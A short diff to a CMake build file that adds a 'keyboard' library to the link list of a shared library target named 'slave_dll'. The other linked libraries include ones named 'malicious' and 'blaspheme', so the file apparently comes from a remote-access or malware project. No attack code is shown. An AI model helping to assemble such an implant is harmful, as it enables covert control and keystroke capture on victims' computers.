@@ -3,7 +3,7 @@ set(SLAVE_DLL_TARGET "slave_dll")
 file(GLOB_RECURSE slave_dll_source_files dll/*)
 add_library(${SLAVE_DLL_TARGET} SHARED ${slave_dll_source_files})
 set_target_properties(${SLAVE_DLL_TARGET} PROPERTIES COMPILE_FLAGS ${BUILD_FLAGS_MT} COMPILE_DEFINITIONS PROJECT_MODULE="${SLAVE_DLL_TARGET}")
-target_link_libraries(${SLAVE_DLL_TARGET} system network blaspheme malicious log userenv)
+target_link_libraries(${SLAVE_DLL_TARGET} system keyboard network blaspheme malicious log userenv)
 
 add_custom_command(
 	TARGET ${SLAVE_DLL_TARGET}
